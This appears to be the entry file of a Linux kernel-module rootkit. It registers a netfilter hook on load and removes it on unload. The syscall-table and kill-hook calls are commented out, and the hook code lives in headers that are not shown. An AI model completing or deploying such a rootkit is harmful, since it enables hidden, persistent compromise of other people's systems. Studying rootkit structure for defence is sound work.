#include <linux/kernel.h>
#include <linux/module.h>
#include "../include/hook_net.h" 
#include "../include/hook_kill.h"



int init_module() {
  printk(KERN_INFO "Starting Rootkit\n");
  //get_syscall_table_ptrs();  
  //init_kill_hook();
  register_net_hook();
  return 0;
}


void cleanup_module() {
  nf_unregister_net_hook(&init_net, &nfhook);
  //remove_hook_kill()
  printk(KERN_INFO "Stoping Rootkit\n");
}

MODULE_LICENSE("Sde");
